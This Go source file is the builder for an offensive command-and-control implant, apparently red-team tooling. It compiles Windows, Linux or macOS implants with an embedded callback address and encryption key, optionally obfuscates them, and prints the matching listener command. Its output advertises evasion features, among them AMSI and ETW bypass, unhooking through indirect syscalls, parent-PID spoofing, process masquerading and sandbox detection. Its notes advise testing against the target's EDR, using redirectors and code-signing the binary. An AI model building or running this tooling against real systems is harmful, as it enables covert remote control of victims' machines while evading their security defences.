// rta-implant builder — generates the implant binary with embedded configuration.
// Run on your attacker machine (Kali/Parrot).
//
// Usage:
//   go run cmd/builder/main.go \
//     --lhost 10.10.14.5 --lport 443 \
//     --key "$(openssl rand -hex 16)" \
//     --os windows --arch amd64 \
//     --sleep 30 --jitter 0.4 \
//     --output implant.exe
//
// The builder compiles the implant with the config baked into the binary
// via -ldflags, then optionally strips symbols and runs garble.

package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func main() {
	lhost := flag.String("lhost", "", "Listener IP address (required)")
	lport := flag.String("lport", "443", "Listener port")
	key := flag.String("key", "", "AES-256 hex key (32 bytes / 64 hex chars). Auto-generated if empty")
	targetOS := flag.String("os", "windows", "Target OS: windows, linux, darwin")
	arch := flag.String("arch", "amd64", "Target architecture: amd64, arm64")
	sleep := flag.String("sleep", "30", "Base sleep interval in seconds")
	jitter := flag.String("jitter", "0.3", "Jitter percentage (0.0-1.0)")
	output := flag.String("output", "implant.exe", "Output binary filename")
	transport := flag.String("transport", "https", "Transport: https, dns, raw-tls")
	useGarble := flag.Bool("garble", false, "Use garble for binary obfuscation (requires garble installed)")
	flag.Parse()

	if *lhost == "" {
		fmt.Println("[-] --lhost is required")
		flag.Usage()
		os.Exit(1)
	}

	// Auto-generate AES key if not provided
	if *key == "" {
		keyBytes := make([]byte, 32)
		if _, err := rand.Read(keyBytes); err != nil {
			fmt.Printf("[-] Failed to generate key: %v\n", err)
			os.Exit(1)
		}
		*key = hex.EncodeToString(keyBytes)
		fmt.Printf("[+] Generated AES-256 key: %s\n", *key)
		fmt.Println("[!] Save this key — you need it for the listener")
	}

	if len(*key) != 64 {
		fmt.Printf("[-] Key must be 64 hex characters (32 bytes). Got %d chars\n", len(*key))
		os.Exit(1)
	}

	// Build the ldflags to inject configuration at compile time
	ldflags := fmt.Sprintf(
		"-s -w -X main.cfgHost=%s -X main.cfgPort=%s -X main.cfgKey=%s -X main.cfgSleep=%s -X main.cfgJitter=%s -X main.cfgTransport=%s",
		*lhost, *lport, *key, *sleep, *jitter, *transport,
	)

	fmt.Println("[*] Building implant...")
	fmt.Printf("    Target:    %s/%s\n", *targetOS, *arch)
	fmt.Printf("    Callback:  %s:%s (%s)\n", *lhost, *lport, *transport)
	fmt.Printf("    Sleep:     %ss ± %s%%\n", *sleep, *jitter)
	fmt.Printf("    Output:    %s\n", *output)
	fmt.Printf("    Garble:    %v\n", *useGarble)

	compiler := "go"
	if *useGarble {
		if _, err := exec.LookPath("garble"); err != nil {
			fmt.Println("[-] garble not found. Install: go install mvdan.cc/garble@latest")
			os.Exit(1)
		}
		compiler = "garble"
	}

	args := []string{"build", "-ldflags", ldflags, "-trimpath", "-o", *output, "./cmd/implant"}
	if *useGarble {
		args = append([]string{"-literals", "-tiny", "-seed=random"}, args...)
	}

	cmd := exec.Command(compiler, args...)
	cmd.Env = append(os.Environ(),
		"GOOS="+*targetOS,
		"GOARCH="+*arch,
		"CGO_ENABLED=0",
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Build failed: %v\n", err)
		os.Exit(1)
	}

	// File size
	info, _ := os.Stat(*output)
	sizeMB := float64(info.Size()) / 1024 / 1024

	fmt.Println()
	fmt.Printf("[+] Built: %s (%.1f MB)\n", *output, sizeMB)
	fmt.Println()
	fmt.Println("[*] Start the listener:")
	fmt.Printf("    go run cmd/listener/main.go --lhost 0.0.0.0 --lport %s --key %s\n", *lport, *key)

	// Detection tips
	fmt.Println()
	fmt.Println("[*] Evasion features active:")
	features := []string{
		"AES-256-GCM encrypted C2 channel",
		"XOR-encrypted strings (no plaintext API names in binary)",
		"Indirect syscalls via fresh ntdll mapping (bypasses all userland hooks)",
		"ETW bypass via indirect NtProtectVirtualMemory (loaded ntdll untouched)",
		"AMSI bypass via indirect NtProtectVirtualMemory",
		"Sleep obfuscation (sensitive memory XOR-encrypted during sleep)",
		"JA3 fingerprint spoofing (Chrome-like TLS ClientHello)",
		"Parent PID spoofing (cmd.exe spawns under explorer.exe)",
		"Process masquerading (PEB shows RuntimeBroker.exe)",
		"Sleep jitter via crypto/rand (irregular callback intervals)",
		"Sandbox detection (CPU, hostname, uptime, debugger checks)",
		"Stripped symbols (-s -w)",
	}
	if *useGarble {
		features = append(features,
			"Garble obfuscation (mangled symbols, encrypted literals)",
		)
	}
	for _, f := range features {
		fmt.Printf("    [+] %s\n", f)
	}

	fmt.Println()
	fmt.Println("[*] Operational notes:")
	fmt.Println("    - Test in a VM with your target EDR before deploying")
	fmt.Println("    - Change the AES key per engagement")
	fmt.Println("    - Consider signing the binary with a code-signing cert")
	fmt.Println("    - Use a redirector between the implant and your listener")
	_ = strings.TrimSpace("") // suppress unused import
}
